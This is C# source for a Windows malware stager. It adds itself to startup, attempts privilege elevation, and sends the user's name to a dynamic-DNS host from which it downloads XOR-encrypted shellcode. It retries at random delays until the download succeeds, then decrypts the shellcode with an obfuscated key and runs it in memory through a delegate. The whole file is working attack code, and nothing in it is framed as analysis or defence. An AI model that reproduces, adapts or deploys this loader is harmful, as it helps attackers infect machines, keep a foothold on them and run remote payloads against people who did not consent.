using System.Net;
using System.Runtime.InteropServices;

namespace Stager
{
    internal class Program
    {
        delegate void ShellcodeDelegate();

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        static void Main()
        {
            string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            CurrentSystem system = new CurrentSystem();
            
            string keyHex = system.DecodeString(("?dbd" + "b??dbd?" + "d??9d").Replace("?", ":"));
            Console.WriteLine(keyHex);
            string shellcodeUrl = "http://aui.hopto.org/images";

            try
            {
                if (system.IsAdministrator() == false)
                {
                    system.TryAdmin();
                    system.AddToStartup();
                }
                else
                {
                    system.AddToStartup();
                }
            }
            catch (Exception ex)
            {
                var a = ex.ToString();
            }
            

            bool success = false;
            WebClient client = new WebClient();
            byte[] encryptedShellcode = null;

            Random rand = new Random();
            while (!success)
            {
                try
                {
                    var encodedUserName = System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(userName));
                    encryptedShellcode = client.DownloadData(shellcodeUrl + "?id=" + encodedUserName);
                    success = true;

                }
                catch (Exception ex)
                {
                    Console.WriteLine("Could not download: " + ex.Message);
                    int delay = rand.Next(16000, 40000);
                    System.Threading.Thread.Sleep(delay);

                }
            }

            byte[] key = new byte[keyHex.Length / 2];
            for (int i = 0; i < key.Length; i++)
            {
                key[i] = Convert.ToByte(keyHex.Substring(i * 2, 2), 16);
            }
            byte[] shellcode = new byte[encryptedShellcode.Length];
            for (int i = 0; i < encryptedShellcode.Length; i++)
            {
                shellcode[i] = (byte)(encryptedShellcode[i] ^ key[i % key.Length]);
            }

            /*
            IntPtr shellcodeAddr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000, 0x40);
            Marshal.Copy(shellcode, 0, shellcodeAddr, shellcode.Length);
            Action shellcodeFunc = (Action)Marshal.GetDelegateForFunctionPointer(shellcodeAddr, typeof(Action));
            shellcodeFunc();
            
             Old execution method
             */
            IntPtr shellcodeAddr = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, shellcodeAddr, shellcode.Length);

            // Create delegate to shellcode
            ShellcodeDelegate shellcodeFunc = (ShellcodeDelegate)Marshal.GetDelegateForFunctionPointer(shellcodeAddr, typeof(ShellcodeDelegate));

            // Invoke shellcode
            shellcodeFunc();

            // Free allocated memory
            Marshal.FreeHGlobal(shellcodeAddr);

        }
    }

}
